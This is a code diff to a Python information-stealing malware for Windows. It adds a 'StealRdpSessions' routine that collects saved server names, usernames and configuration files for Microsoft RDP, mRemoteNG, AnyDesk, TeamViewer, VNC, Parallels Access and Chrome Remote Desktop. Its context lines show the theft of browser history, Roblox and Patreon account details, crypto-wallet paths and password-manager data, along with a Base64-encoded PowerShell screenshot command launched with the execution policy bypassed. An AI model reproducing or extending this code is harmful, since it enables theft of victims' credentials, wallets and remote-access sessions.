@@ -16,6 +16,7 @@ import winreg
 import json
 import hmac
 import zipfile
+import xml.etree.ElementTree as ET
 import aiohttp, psutil, win32api # type: ignore
 
 from typing import List
@@ -50,6 +51,7 @@ class ListFonction:
     WifiInfo = list()
     FileSystemInfo = list()
     SystemInfo = list()
+    RdpSession = list()
     ApplicationsInfo = list()
     DiscordAccounts = list()
     FacebookAccounts = list()
@@ -391,7 +393,7 @@ class get_data:
                     cursor.execute('SELECT id, url, title, visit_count, last_visit_date FROM moz_places')
                     historys = cursor.fetchall()
                     for history in historys:
-                        self.GeckoHistoryList.append(f"ID: {history[0]}\nRL: {history[1]}\nTitle: {history[2]}\nVisit Count: {history[3]}\nLast Visit Time: {history[4]}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
+                        self.GeckoHistoryList.append(f"ID: {history[0]}\nURL: {history[1]}\nTitle: {history[2]}\nVisit Count: {history[3]}\nLast Visit Time: {history[4]}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
         except Exception as Error:
             logs_handler(f"[ERROR] - getting Mozilla historys - {str(Error)}")
         else:
@@ -564,7 +566,7 @@ class get_data:
             social_connections = data.get("data", {}).get("attributes", {}).get("social_connections", {})
             created = req("created", "Couldn't get creation date")
             email = req("email", "Couldn't get email")
-            verified = '✅' if req("is_email_verified", False) else '❌'
+            verified = 'True' if req("is_email_verified", False) else 'False'
             currency = req("patron_currency", "Couldn't get currency")
             bio = req("about", "Couldn't get bio/No bio")
             non_null_social_connections = [key for key, value in social_connections.items() if value is not None]
@@ -1245,6 +1247,7 @@ class get_data:
                 "Metamask (Opera)": "djclckkglechooblngghdinmeemkbgci",
                 "Ronin (Edge)": "bblmcdckkhkhfhhpfcchlpalebmonecp",
                 }
+            
             wallet_local_paths = {
                 "Bitcoin": os.path.join(self.appdata, "Bitcoin", "wallets"),
                 "Bytecoin": os.path.join(self.appdata, "bytecoin"),
@@ -2114,6 +2117,139 @@ asyncio.run(main())
         except Exception as Error:
             logs_handler(f"[ERROR] - getting passwords extensions: {str(Error)}")
 
+
+
+    async def StealRdpSessions(self, directory_path) -> None:
+        paths_dict = {
+            "Microsoft RDP": r"Software\Microsoft\Terminal Server Client\Servers",
+            "Remote Desktop Manager": os.path.join(os.getenv("APPDATA"), "Devolutions", "RemoteDesktopManager"),
+            "mRemoteNG": os.path.join(os.getenv("APPDATA"), "mRemoteNG", "confCons.xml"),
+            "AnyDesk": os.path.join(os.getenv("APPDATA"), "AnyDesk"),
+            "TeamViewer": os.path.join(os.getenv("APPDATA"), "TeamViewer"),
+            "VNC Clients": [os.path.join(os.getenv("APPDATA"), "TightVNC"), os.path.join(os.getenv("APPDATA"), "RealVNC")],
+            "Parallels Access": os.path.join(os.getenv("APPDATA"), "Parallels", "Access"),
+            "Chrome Remote Desktop": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Extensions")
+        }
+
+        rdp_sessions_path = os.path.join(directory_path, "RDP Sessions")
+        os.makedirs(rdp_sessions_path, exist_ok=True)
+
+        try:
+            try:
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, paths_dict["Microsoft RDP"])
+                for i in range(winreg.QueryInfoKey(key)[0]):
+                    server_name = winreg.EnumKey(key, i)
+                    try:
+                        server_key = winreg.OpenKey(key, server_name)
+                        username = winreg.QueryValueEx(server_key, "UsernameHint")[0]
+                    except FileNotFoundError:
+                        username = "No Username"
+                    ListFonction.RdpSession.append({"application": "Microsoft RDP", "server": server_name, "username": username})
+                    app_path = os.path.join(rdp_sessions_path, "Microsoft RDP")
+                    os.makedirs(app_path, exist_ok=True)
+                    with open(os.path.join(app_path, f"{server_name}_session.txt"), "w") as f:
+                        f.write(f"Server: {server_name}\nUsername: {username}")
+            except Exception as e:
+                print(f"[ERROR] Microsoft RDP: {e}")
+
+            try:
+                app_path = os.path.join(rdp_sessions_path, "Remote Desktop Manager")
+                os.makedirs(app_path, exist_ok=True)
+                for file in os.listdir(paths_dict["Remote Desktop Manager"]):
+                    if file.endswith((".json", ".xml")):
+                        with open(os.path.join(paths_dict["Remote Desktop Manager"], file), "r") as f:
+                            data = f.read()
+                            ListFonction.RdpSession.append({"application": "Remote Desktop Manager", "data": data})
+                            with open(os.path.join(app_path, file), "w") as save_file:
+                                save_file.write(data)
+            except Exception as e:
+                print(f"[ERROR] Remote Desktop Manager: {e}")
+
+            try:
+                app_path = os.path.join(rdp_sessions_path, "mRemoteNG")
+                os.makedirs(app_path, exist_ok=True)
+                tree = ET.parse(paths_dict["mRemoteNG"])
+                root = tree.getroot()
+                for connection in root.findall("Connection"):
+                    name, username, host = connection.get("Name"), connection.get("Username", "No Username"), connection.get("ServerName", "No Server")
+                    ListFonction.RdpSession.append({"application": "mRemoteNG", "name": name, "server": host, "username": username})
+                    with open(os.path.join(app_path, f"{name}_session.xml"), "w") as f:
+                        f.write(ET.tostring(connection, encoding="unicode"))
+            except Exception as e:
+                print(f"[ERROR] mRemoteNG: {e}")
+
+            try:
+                app_path = os.path.join(rdp_sessions_path, "AnyDesk")
+                os.makedirs(app_path, exist_ok=True)
+                for file in os.listdir(paths_dict["AnyDesk"]):
+                    if file.endswith(".txt"):
+                        with open(os.path.join(paths_dict["AnyDesk"], file), "r") as f:
+                            data = f.read()
+                            ListFonction.RdpSession.append({"application": "AnyDesk", "data": data})
+                            with open(os.path.join(app_path, file), "w") as save_file:
+                                save_file.write(data)
+            except Exception as e:
+                print(f"[ERROR] AnyDesk: {e}")
+
+            try:
+                app_path = os.path.join(rdp_sessions_path, "TeamViewer")
+                os.makedirs(app_path, exist_ok=True)
+                for file in os.listdir(paths_dict["TeamViewer"]):
+                    if file.endswith((".log", ".ini")):
+                        with open(os.path.join(paths_dict["TeamViewer"], file), "r") as f:
+                            data = f.read()
+                            ListFonction.RdpSession.append({"application": "TeamViewer", "data": data})
+                            with open(os.path.join(app_path, file), "w") as save_file:
+                                save_file.write(data)
+            except Exception as e:
+                print(f"[ERROR] TeamViewer: {e}")
+
+            try:
+                app_path = os.path.join(rdp_sessions_path, "VNC Clients")
+                os.makedirs(app_path, exist_ok=True)
+                for vnc_path in paths_dict["VNC Clients"]:
+                    for file in os.listdir(vnc_path):
+                        if file.endswith((".vnc", ".reg")):
+                            with open(os.path.join(vnc_path, file), "r") as f:
+                                data = f.read()
+                                ListFonction.RdpSession.append({"application": "VNC Client", "data": data})
+                                with open(os.path.join(app_path, file), "w") as save_file:
+                                    save_file.write(data)
+            except Exception as e:
+                print(f"[ERROR] VNC Clients: {e}")
+
+            try:
+                app_path = os.path.join(rdp_sessions_path, "Parallels Access")
+                os.makedirs(app_path, exist_ok=True)
+                for file in os.listdir(paths_dict["Parallels Access"]):
+                    if file.endswith(".json"):
+                        with open(os.path.join(paths_dict["Parallels Access"], file), "r") as f:
+                            data = json.load(f)
+                            ListFonction.RdpSession.append({"application": "Parallels Access", "data": data})
+                            with open(os.path.join(app_path, file), "w") as save_file:
+                                json.dump(data, save_file)
+            except Exception as e:
+                print(f"[ERROR] Parallels Access: {e}")
+
+            try:
+                app_path = os.path.join(rdp_sessions_path, "Chrome Remote Desktop")
+                os.makedirs(app_path, exist_ok=True)
+                for root, _, files in os.walk(paths_dict["Chrome Remote Desktop"]):
+                    for file in files:
+                        if "chrome_remote_desktop" in file:
+                            with open(os.path.join(root, file), "r") as f:
+                                data = f.read()
+                                ListFonction.RdpSession.append({"application": "Chrome Remote Desktop", "data": data})
+                                with open(os.path.join(app_path, file), "w") as save_file:
+                                    save_file.write(data)
+            except Exception as e:
+                print(f"[ERROR] Chrome Remote Desktop: {e}")
+
+        except Exception as e:
+            print(f"[ERROR] General Exception: {e}")
+
+
+
     async def StealSteamUser(self) -> None:
         try:
             all_disks = []
@@ -2384,8 +2520,8 @@ asyncio.run(main())
 
                     friend_list = []
                     for friend in friends_data:
-                        banned_status = "✅" if friend.get('isBanned', False) else "❌"
-                        verified_status = "✅" if friend.get('hasVerifiedBadge', False) else "❌"
+                        banned_status = "True" if friend.get('isBanned', False) else "False"
+                        verified_status = "True" if friend.get('hasVerifiedBadge', False) else "False"
                         friend_list.append((friend.get('displayName', ''), friend.get('name', ''), banned_status, verified_status))
 
                     return friend_list
@@ -2424,9 +2560,9 @@ asyncio.run(main())
             current_timestamp = time.time()
             days_passed = round((current_timestamp - creation_timestamp) / (24 * 60 * 60))
 
-            premium = '✅' if base_info["IsPremium"] else '❌'
-            builder_club = '✅' if base_info["IsAnyBuildersClubMember"] else '❌'
-            banned = '✅' if advanced_info["IsBanned"] else '❌'
+            premium = 'True' if base_info["IsPremium"] else 'False'
+            builder_club = 'True' if base_info["IsAnyBuildersClubMember"] else 'False'
+            banned = 'True' if advanced_info["IsBanned"] else 'False'
 
             ListFonction.RobloxAccounts.append(f"Browser: {browser}\nBrowser Cookie: {browsercookies}\nCookie: {cookie}\nUser: {base_info['UserName']} ({base_info['UserID']})\nThumbnail: {base_info['ThumbnailUrl']}\nRobux: {base_info['RobuxBalance']}\nPremium: {premium}\nBuilder Club: {builder_club}\nCreation Date: {advanced_info['CreationDate']} / {days_passed} Days!\nDescription: {advanced_info['Description']}\nBanned: {banned}\nRAP: {rap}\nFriends List: {friend_list}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
 
@@ -2557,6 +2693,7 @@ asyncio.run(main())
             os.makedirs(os.path.join(filePath, "Computer"), exist_ok=True)
             os.makedirs(os.path.join(filePath, "Sessions"), exist_ok=True)
             os.makedirs(os.path.join(filePath, "Games"), exist_ok=True)
+            os.makedirs(os.path.join(filePath, "RDP Sessions"), exist_ok=True)
 
             command = "JABzAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4ARwBlAG4AZQByAGkAYwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFMAYwByAGUAZQBuAHMAaABvAHQADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAEwAaQBzAHQAPABCAGkAdABtAGEAcAA+ACAAQwBhAHAAdAB1AHIAZQBTAGMAcgBlAGUAbgBzACgAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdABzACAAPQAgAG4AZQB3ACAATABpAHMAdAA8AEIAaQB0AG0AYQBwAD4AKAApADsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGEAbABsAFMAYwByAGUAZQBuAHMAIAA9ACAAUwBjAHIAZQBlAG4ALgBBAGwAbABTAGMAcgBlAGUAbgBzADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAUwBjAHIAZQBlAG4AIABzAGMAcgBlAGUAbgAgAGkAbgAgAGEAbABsAFMAYwByAGUAZQBuAHMAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIAZQBjAHQAYQBuAGcAbABlACAAYgBvAHUAbgBkAHMAIAA9ACAAcwBjAHIAZQBlAG4ALgBCAG8AdQBuAGQAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAcwBpAG4AZwAgACgAQgBpAHQAbQBhAHAAIABiAGkAdABtAGEAcAAgAD0AIABuAGUAdwAgAEIAaQB0AG0AYQBwACgAYgBvAHUAbgBkAHMALgBXAGkAZAB0AGgALAAgAGIAbwB1AG4AZABzAC4ASABlAGkAZwBoAHQAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AHMAaQBuAGcAIAAoAEcAcgBhAHAAaABpAGMAcwAgAGcAcgBhAHAAaABpAGMAcwAgAD0AIABHAHIAYQBwAGgAaQBjAHMALgBGAHIAbwBtAEkAbQBhAGcAZQAoAGIAaQB0AG0AYQBwACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGcAcgBhAHAAaABpAGMAcwAuAEMAbwBwAHkARgByAG8AbQBTAGMAcgBlAGUAbgAoAG4AZQB3ACAAUABvAGkAbgB0ACgAYgBvAHUAbgBkAHMALgBMAGUAZgB0ACwAIABiAG8AdQBuAGQAcwAuAFQAbwBwACkALAAgAFAAbwBpAG4AdAAuAEUAbQBwAHQAeQAsACAAYgBvAHUAbgBkAHMALgBTAGkAegBlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHMAdQBsAHQAcwAuAEEAZABkACgAKABCAGkAdABtAGEAcAApAGIAaQB0AG0AYQBwAC4AQwBsAG8AbgBlACgAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwAgAEgAYQBuAGQAbABlACAAYQBuAHkAIABlAHgAYwBlAHAAdABpAG8AbgBzACAAaABlAHIAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIAByAGUAcwB1AGwAdABzADsADQAKACAAIAAgACAAfQANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlACAALQBSAGUAZgBlAHIAZQBuAGMAZQBkAEEAcwBzAGUAbQBiAGwAaQBlAHMAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoADQAKACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzACAAPQAgAFsAUwBjAHIAZQBlAG4AcwBoAG8AdABdADoAOgBDAGEAcAB0AHUAcgBlAFMAYwByAGUAZQBuAHMAKAApAA0ACgANAAoADQAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQAcwAuAEMAbwB1AG4AdAA7ACAAJABpACsAKwApAHsADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0ACAAPQAgACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzAFsAJABpAF0ADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0AC4AUwBhAHYAZQAoACIALgAvAEQAaQBzAHAAbABhAHkAIAAoACQAKAAkAGkAKwAxACkAKQAuAHAAbgBnACIAKQANAAoAIAAgACAAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQALgBEAGkAcwBwAG8AcwBlACgAKQANAAoAfQA=" # Unicode encoded command
             process = await asyncio.create_subprocess_shell(f"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {command}", cwd=filePath, shell=True)
@@ -2665,6 +2802,11 @@ asyncio.run(main())
                     for value in ListFonction.MinecraftAccount:
                         file.write(value)
 
+            if ListFonction.RdpSession:
+                with open(os.path.join(filePath, "RDP Sessions", "sessions_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    for value in ListFonction.RdpSession:
+                        file.write(value)
+
 
             if len(os.listdir(os.path.join(filePath, "Mozilla"))) == 0:
                 try:shutil.rmtree(os.path.join(filePath, "Mozilla"))
@@ -2676,6 +2818,10 @@ asyncio.run(main())
 
             if len(os.listdir(os.path.join(filePath, "Sessions"))) == 0:
                 try:shutil.rmtree(os.path.join(filePath, "Sessions"))
+                except:pass
+
+            if len(os.listdir(os.path.join(filePath, "RDP Sessions"))) == 0:
+                try:shutil.rmtree(os.path.join(filePath, "RDP Sessions"))
                 except:pass
             
 
@@ -2700,6 +2846,7 @@ asyncio.run(main())
                 self.StealSmartFTP(filePath),
                 self.StealTotalCommander(filePath),
                 self.StealWinSCP(filePath),
+                self.StealRdpSessions(filePath),
                 self.BackupMailbird(filePath),
                 self.BackupThunderbird(filePath),
                 self.StealPasswordManagers(filePath),
